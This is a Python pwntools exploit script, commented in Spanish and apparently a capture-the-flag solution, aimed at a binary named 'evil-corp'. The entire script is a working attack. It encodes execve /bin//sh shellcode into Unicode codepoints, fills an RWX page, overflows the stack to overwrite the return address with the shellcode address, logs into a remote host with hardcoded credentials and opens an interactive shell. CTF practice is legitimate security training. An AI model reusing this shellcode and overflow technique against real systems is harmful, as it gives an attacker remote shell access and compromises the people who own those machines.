from pwn import *

context.arch = "amd64"
context.os = "linux"
context.endian = "little"

BINARY = "./evil-corp"

# Página RWX creada por Setup()
RWX = 0x11000

# Índice wchar donde empieza el saved return address
RET_INDEX = 4002

# 2048 wchar * 2 bytes = 4096 bytes
# 0x10000 + 4096 = 0x11000
SHELLCODE_START = 2048

# Nuestro shellcode /bin//sh
shellcode = bytes.fromhex(
    "4831c050"
    "48bb2f62696e2f2f7368"
    "53"
    "4889e7"
    "50"
    "57"
    "4889e6"
    "4831d2"
    "4831c0"
    "b03b"
    "0f05"
)


def encode_shellcode(raw):
    """
    Empaqueta cada 2 bytes del shellcode dentro
    de un Unicode codepoint.
    """

    if len(raw) % 2:
        raw += b"\x00"

    encoded = b""

    for i in range(0, len(raw), 2):
        codepoint = raw[i] | (raw[i + 1] << 8)
        encoded += chr(codepoint).encode("utf-8")

    return encoded, len(raw) // 2


encoded_shellcode, shellcode_wchars = encode_shellcode(shellcode)

# U+0101:
# al convertirse después a 16 bits produce 01 01.
FILL = chr(0x0101).encode("utf-8")

payload = b""

# 1. Llenar desde 0x10000 hasta 0x11000
payload += FILL * SHELLCODE_START

# 2. Colocar nuestro shellcode desde 0x11000
payload += encoded_shellcode

# 3. Terminar la copia realizada por wcharToChar16
payload += b"\x00"

# Hasta ahora consumimos estos wchar
used = SHELLCODE_START + shellcode_wchars + 1

# 4. Seguir rellenando el stack hasta el return address
payload += FILL * (RET_INDEX - used)

# 5. Sobrescribir RIP con 0x11000
payload += chr(RWX).encode("utf-8")

# Parte alta del address = 0
payload += b"\x00"

io = remote("154.57.164.65", 30836)

# Login
io.send(b"eliot\n")
io.send(b"4007\n")

# Contact Support
io.send(b"2\n")

# Overflow
io.send(payload + b"\n")

# Shell
io.interactive()
